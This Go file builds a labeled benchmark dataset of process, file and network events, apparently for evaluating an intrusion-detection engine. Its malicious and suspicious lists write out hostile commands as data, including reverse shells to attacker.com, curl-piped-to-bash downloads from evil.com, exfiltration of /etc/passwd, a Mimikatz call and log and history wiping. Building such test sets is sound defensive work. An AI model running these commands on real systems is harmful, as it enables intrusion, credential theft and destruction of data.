package main

import (
	"fmt"
	"sync/atomic"
	"time"
)

type LabeledEvent struct {
	Event              Event
	ExpectedVerdict    string
	ExpectedSuspicious bool
}

var benchIDSeq uint64

func nextBenchID() string {
	return fmt.Sprintf("%d-%d", time.Now().UnixNano(), atomic.AddUint64(&benchIDSeq, 1))
}

func benchDataset() []LabeledEvent {
	var dataset []LabeledEvent

	benign := []struct {
		image string
		cmd   string
	}{
		{"ls", "ls -la"},
		{"ls", "ls /home/user"},
		{"ls", "ls -la /var/log"},
		{"cat", "cat /etc/passwd"},
		{"cat", "cat /var/log/syslog"},
		{"cat", "cat file.txt"},
		{"grep", "grep -r 'error' /var/log"},
		{"grep", "grep pattern file.txt"},
		{"find", "find / -name '*.go'"},
		{"find", "find /tmp -type f -mtime +7"},
		{"git", "git clone http://github.com/repo"},
		{"git", "git pull origin main"},
		{"git", "git push origin feature"},
		{"git", "git commit -m 'update'"},
		{"git", "git status"},
		{"git", "git diff HEAD~1"},
		{"apt", "apt update"},
		{"apt", "apt install nginx"},
		{"apt", "apt remove curl"},
		{"dpkg", "dpkg -l"},
		{"make", "make -j4"},
		{"make", "make clean"},
		{"gcc", "gcc -o main main.c"},
		{"go", "go build ./..."},
		{"go", "go test ./..."},
		{"go", "go mod tidy"},
		{"python3", "python3 script.py"},
		{"python3", "python3 -m http.server 8080"},
		{"python3", "python3 -m pip install requests"},
		{"python3", "python3 manage.py migrate"},
		{"node", "node server.js"},
		{"npm", "npm install"},
		{"npm", "npm run build"},
		{"docker", "docker build -t app ."},
		{"docker", "docker ps"},
		{"docker", "docker-compose up"},
		{"docker", "docker logs container1"},
		{"vim", "vim file.py"},
		{"nano", "nano /etc/hosts"},
		{"systemctl", "systemctl restart nginx"},
		{"systemctl", "systemctl status docker"},
		{"journalctl", "journalctl -u ssh"},
		{"cp", "cp file1.txt file2.txt"},
		{"mv", "mv old.txt new.txt"},
		{"rm", "rm -rf /tmp/build"},
		{"chmod", "chmod 755 script.sh"},
		{"chown", "chown user:group file.txt"},
		{"tar", "tar -czf archive.tar.gz /data"},
		{"curl", "curl https://api.example.com/data"},
		{"curl", "curl -s https://httpbin.org/get"},
		{"curl", "curl -X POST https://api.example.com/submit"},
		{"curl", "curl -H 'Authorization: Bearer token' https://api.example.com/users"},
		{"wget", "wget https://example.com/file.tar.gz"},
		{"wget", "wget -q https://releases.com/v2.0/binary"},
		{"ssh", "ssh user@host"},
		{"scp", "scp file.txt user@host:/tmp"},
		{"rsync", "rsync -avz src/ dest/"},
		{"ps", "ps aux"},
		{"top", "top -b -n 1"},
		{"htop", "htop"},
		{"df", "df -h"},
		{"du", "du -sh /var/log"},
		{"free", "free -m"},
		{"uptime", "uptime"},
		{"whoami", "whoami"},
		{"id", "id"},
		{"hostname", "hostname"},
		{"uname", "uname -a"},
		{"date", "date"},
		{"echo", "echo hello world"},
		{"sed", "sed 's/old/new/g' file.txt"},
		{"awk", "awk '{print $1}' file.txt"},
		{"sort", "sort -k2 file.txt"},
		{"uniq", "uniq -c file.txt"},
		{"wc", "wc -l file.txt"},
		{"head", "head -n 20 file.txt"},
		{"tail", "tail -f /var/log/syslog"},
		{"tee", "echo data | tee output.txt"},
		{"xargs", "find . -name '*.go' | xargs grep 'func'"},
		{"env", "env"},
		{"which", "which python3"},
		{"less", "less /var/log/syslog"},
		{"diff", "diff file1.txt file2.txt"},
		{"patch", "patch -p1 < fix.patch"},
		{"mkdir", "mkdir -p /opt/app/config"},
		{"ln", "ln -s /usr/local/bin/app /usr/bin/app"},
		{"mount", "mount /dev/sda1 /mnt/data"},
		{"ping", "ping -c 3 google.com"},
		{"traceroute", "traceroute google.com"},
		{"dig", "dig example.com"},
		{"nslookup", "nslookup example.com"},
		{"ip", "ip addr show"},
		{"ss", "ss -tlnp"},
		{"iptables", "iptables -L -n"},
		{"openssl", "openssl s_client -connect host:443"},
		{"python3", "python3 -c 'print(2+2)'"},
		{"node", "node -e 'console.log(1+1)'"},
		{"ruby", "ruby script.rb"},
		{"java", "java -jar app.jar"},
		{"mvn", "mvn clean install"},
		{"gradle", "gradle build"},
	}

	for _, b := range benign {
		id := nextBenchID()
		dataset = append(dataset, LabeledEvent{
			Event: Event{
				Timestamp:   time.Now(),
				HostName:    "bench-host",
				EventType:   "execve",
				EventID:     "bench-benign-" + id,
				ProcessGUID: "bench-host-1000-" + id,
				ParentGUID:  "bench-host-1-" + id,
				ProcessID:   1000,
				ParentPID:   1,
				ImagePath:   b.image,
				CommandLine: b.cmd,
				User:        "user",
			},
			ExpectedVerdict:    "benign",
			ExpectedSuspicious: false,
		})
	}

	suspicious := []struct {
		image string
		cmd   string
	}{
		{"bash", "base64 -d <<< YWJj"},
		{"bash", "echo dGVzdA== | base64 -d"},
		{"python3", "python3 -c 'import socket; s=socket.socket()'"},
		{"python3", "python3 -c 'import subprocess; subprocess.run([\"ls\"])'"},
		{"curl", "curl -sO http://example.com/file"},
		{"wget", "wget --post-data='data' http://example.com/endpoint"},
		{"bash", "bash -c 'history -c'"},
		{"sh", "sh -c 'env'"},
		{"nc", "nc -v 10.0.0.1 22"},
		{"nc", "nc -zv 192.168.1.1 80"},
		{"curl", "curl -s http://internal-api:8080/health"},
		{"bash", "echo Y2F0IC9ldGMvc2hhZG93 | base64 -d"},
		{"python3", "python3 -c 'import socket;socket.socket(socket.AF_INET,socket.SOCK_STREAM)'"},
		{"perl", "perl -e 'use Socket'"},
		{"ruby", "ruby -e 'require \"socket\"'"},
		{"php", "php -r 'fsockopen(\"10.0.0.1\",4444);'"},
		{"nc", "nc -w 3 10.0.0.1 22"},
		{"socat", "socat - TCP:10.0.0.1:80"},
		{"curl", "curl -k https://self-signed.example.com/"},
		{"wget", "wget --no-check-certificate https://example.com/"},
		{"bash", "/bin/bash -c 'ls -la'"},
		{"sh", "/bin/sh -c 'echo test'"},
		{"curl", "curl -X DELETE https://api.example.com/resource/1"},
		{"python3", "python3 -c 'import os; os.listdir(\".\")'"},
		{"bash", "bash -c 'cat /proc/self/environ'"},
		{"ncat", "ncat 10.0.0.1 4444"},
		{"socat", "socat STDIO TCP:10.0.0.1:8080"},
		{"python3", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"},
		{"curl", "curl -d @/etc/passwd http://attacker.com/collect"},
		{"wget", "wget -q -O /tmp/survey http://example.com/survey.sh"},
		{"bash", "bash -c 'id && whoami'"},
		{"python3", "python3 -c 'import subprocess;subprocess.Popen(\"id\",shell=True)'"},
		{"bash", "echo dGVzdA== | base64 -d | /bin/sh"},
		{"nc", "nc -u 10.0.0.1 514"},
		{"curl", "curl --connect-timeout 5 http://10.0.0.1:8080/"},
		{"bash", "bash -c 'ps aux | grep root'"},
		{"sh", "/bin/sh -c 'env | grep PASS'"},
		{"bash", "bash -c 'cat /etc/shadow'"},
		{"curl", "curl -T /etc/hosts http://attacker.com/upload"},
		{"wget", "wget -q -O - http://example.com/check | head"},
		{"nc", "nc -l 8080"},
		{"nc", "nc -v -z 10.0.0.0/24 22"},
		{"socat", "socat UDP-RECV:514,fork STDOUT"},
		{"bash", "bash -c 'find / -perm -4000 2>/dev/null'"},
		{"sh", "sh -c 'netstat -tlnp'"},
		{"bash", "bash -c 'awk /password/ /etc/shadow'"},
		{"bash", "bash -c 'chmod 777 /etc/shadow'"},
		{"bash", "bash -c 'export HISTFILE=/dev/null'"},
		{"bash", "bash -c 'crontab /tmp/malicious_cron'"},
	}

	for _, s := range suspicious {
		id := nextBenchID()
		dataset = append(dataset, LabeledEvent{
			Event: Event{
				Timestamp:   time.Now(),
				HostName:    "bench-host",
				EventType:   "execve",
				EventID:     "bench-susp-" + id,
				ProcessGUID: "bench-host-2000-" + id,
				ParentGUID:  "bench-host-1000-" + id,
				ProcessID:   2000,
				ParentPID:   1000,
				ImagePath:   s.image,
				CommandLine: s.cmd,
				User:        "user",
			},
			ExpectedVerdict:    "suspicious",
			ExpectedSuspicious: true,
		})
	}

	malicious := []struct {
		image string
		cmd   string
	}{
		{"curl", "curl http://evil.com/script.sh | bash"},
		{"curl", "curl http://malware.site/payload | sh"},
		{"curl", "curl http://attacker.com/backdoor > /tmp/bd.sh"},
		{"wget", "wget http://evil.com/payload | bash"},
		{"wget", "wget -O- http://malware.site/script | sh"},
		{"wget", "wget http://evil.com/rat > /tmp/rat.sh"},
		{"bash", "bash -i >& /dev/tcp/attacker.com/4444 0>&1"},
		{"sh", "sh -i >& /dev/udp/attacker.com/53 0>&1"},
		{"nc", "nc -e /bin/sh attacker.com 4444"},
		{"nc", "nc -lvp 4444 -e /bin/bash"},
		{"ncat", "ncat -e /bin/sh attacker.com 4444"},
		{"socat", "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh"},
		{"bash", "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ== | base64 -d | bash"},
		{"powershell", "powershell -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')"},
		{"powershell", "powershell -enc SQBFAFgAN..."},
		{"bash", "/bin/bash -c 'curl http://evil.com/x.sh | bash'"},
		{"sh", "/bin/sh -c 'wget -qO- http://evil.com/r.sh | sh'"},
		{"bash", "bash -c 'curl http://c2.server/payload > /dev/shm/run.sh && bash /dev/shm/run.sh'"},
		{"nc", "nc attacker.com 4444 -e /bin/bash"},
		{"socat", "socat EXEC:/bin/sh TCP:attacker.com:4444"},
		{"bash", "bash -i"},
		{"sh", "sh -i"},
		{"curl", "curl -s http://evil.com/keylog > /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden"},
		{"wget", "wget http://evil.com/rootkit -O /tmp/rootkit.sh && bash /tmp/rootkit.sh"},
		{"bash", "bash -c 'exec 5<>/dev/tcp/attacker.com/80; cat <&5 | sh >&5 2>&5'"},
		{"nc", "nc -l -p 4444 -e /bin/sh"},
		{"ncat", "ncat --ssl attacker.com 4444 -e /bin/sh"},
		{"socat", "socat openssl-connect:attacker.com:4443 EXEC:/bin/bash"},
		{"powershell", "powershell -NoProfile -Command Invoke-Mimikatz"},
		{"bash", "/tmp/malware.sh"},
		{"bash", "/var/tmp/backdoor.sh"},
		{"bash", "/dev/shm/payload.bash"},
		{"bash", "curl http://evil.com/agent.sh | bash && rm -rf /var/log/*"},
		{"sh", "/bin/sh -c 'rm -rf /'"},
		{"nc", "nc -lvnp 4444"},
		{"curl", "curl http://evil.com/install.sh | sudo bash"},
		{"wget", "wget -qO- http://c2.evil.com/botnet.sh | bash"},
		{"bash", "/bin/sh -c 'curl -s http://evil.com/x.sh | bash; history -c; rm -rf ~/.bash_history'"},
		{"bash", "bash -c 'mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 4444 > /tmp/f'"},
		{"bash", "bash -c 'for i in $(seq 1 254); do nc -z -w1 10.0.0.$i 22; done'"},
	}

	for _, m := range malicious {
		id := nextBenchID()
		dataset = append(dataset, LabeledEvent{
			Event: Event{
				Timestamp:   time.Now(),
				HostName:    "bench-host",
				EventType:   "execve",
				EventID:     "bench-mal-" + id,
				ProcessGUID: "bench-host-3000-" + id,
				ParentGUID:  "bench-host-2000-" + id,
				ProcessID:   3000,
				ParentPID:   2000,
				ImagePath:   m.image,
				CommandLine: m.cmd,
				User:        "user",
			},
			ExpectedVerdict:    "malicious",
			ExpectedSuspicious: true,
		})
	}

	benignOpen := []struct {
		path  string
		flags string
	}{
		{"/home/user/documents/report.pdf", "O_RDONLY"},
		{"/opt/app/config/settings.yaml", "O_RDONLY"},
		{"/var/log/nginx/access.log", "O_RDONLY"},
		{"/home/user/.bashrc", "O_RDONLY"},
		{"/etc/hostname", "O_RDONLY"},
		{"/proc/cpuinfo", "O_RDONLY"},
	}

	for _, b := range benignOpen {
		id := nextBenchID()
		dataset = append(dataset, LabeledEvent{
			Event: Event{
				Timestamp:   time.Now(),
				HostName:    "bench-host",
				EventType:   "open",
				EventID:     "bench-benign-open-" + id,
				ProcessGUID: "bench-host-4000-" + id,
				ParentGUID:  "bench-host-1-" + id,
				ProcessID:   4000,
				ParentPID:   1,
				FilePath:    b.path,
				FileFlags:   b.flags,
				User:        "user",
			},
			ExpectedVerdict:    "benign",
			ExpectedSuspicious: false,
		})
	}

	suspiciousOpen := []struct {
		path  string
		flags string
	}{
		{"/etc/shadow", "O_RDONLY"},
		{"/etc/passwd", "O_RDONLY"},
		{"/etc/shadow", "O_WRONLY"},
		{"/etc/passwd", "O_WRONLY"},
		{"/home/user/.ssh/authorized_keys", "O_WRONLY|O_CREAT"},
		{"/etc/sudoers", "O_RDWR"},
		{"/etc/crontab", "O_WRONLY"},
		{"/var/log/auth.log", "O_WRONLY"},
		{"/tmp/malware.sh", "O_WRONLY|O_CREAT"},
		{"/etc/ssh/sshd_config", "O_RDWR"},
	}

	for _, s := range suspiciousOpen {
		id := nextBenchID()
		dataset = append(dataset, LabeledEvent{
			Event: Event{
				Timestamp:   time.Now(),
				HostName:    "bench-host",
				EventType:   "open",
				EventID:     "bench-susp-open-" + id,
				ProcessGUID: "bench-host-5000-" + id,
				ParentGUID:  "bench-host-4000-" + id,
				ProcessID:   5000,
				ParentPID:   4000,
				FilePath:    s.path,
				FileFlags:   s.flags,
				User:        "user",
			},
			ExpectedVerdict:    "suspicious",
			ExpectedSuspicious: true,
		})
	}

	benignConnect := []struct {
		addr string
		port uint16
	}{
		{"93.184.216.34", 80},
		{"142.250.80.46", 443},
		{"10.0.0.1", 22},
		{"10.0.0.1", 5432},
		{"10.0.0.1", 3306},
		{"10.0.0.1", 8080},
	}

	for _, b := range benignConnect {
		id := nextBenchID()
		dataset = append(dataset, LabeledEvent{
			Event: Event{
				Timestamp:   time.Now(),
				HostName:    "bench-host",
				EventType:   "connect",
				EventID:     "bench-benign-conn-" + id,
				ProcessGUID: "bench-host-6000-" + id,
				ParentGUID:  "bench-host-1-" + id,
				ProcessID:   6000,
				ParentPID:   1,
				RemoteAddr:  b.addr,
				RemotePort:  b.port,
				User:        "user",
			},
			ExpectedVerdict:    "benign",
			ExpectedSuspicious: false,
		})
	}

	suspiciousConnect := []struct {
		addr string
		port uint16
	}{
		{"10.0.0.1", 4444},
		{"10.0.0.1", 5555},
		{"10.0.0.1", 6666},
		{"10.0.0.1", 31337},
		{"10.0.0.1", 12345},
		{"10.0.0.1", 9999},
	}

	for _, s := range suspiciousConnect {
		id := nextBenchID()
		dataset = append(dataset, LabeledEvent{
			Event: Event{
				Timestamp:   time.Now(),
				HostName:    "bench-host",
				EventType:   "connect",
				EventID:     "bench-susp-conn-" + id,
				ProcessGUID: "bench-host-7000-" + id,
				ParentGUID:  "bench-host-1-" + id,
				ProcessID:   7000,
				ParentPID:   1,
				RemoteAddr:  s.addr,
				RemotePort:  s.port,
				User:        "user",
			},
			ExpectedVerdict:    "suspicious",
			ExpectedSuspicious: true,
		})
	}

	return dataset
}
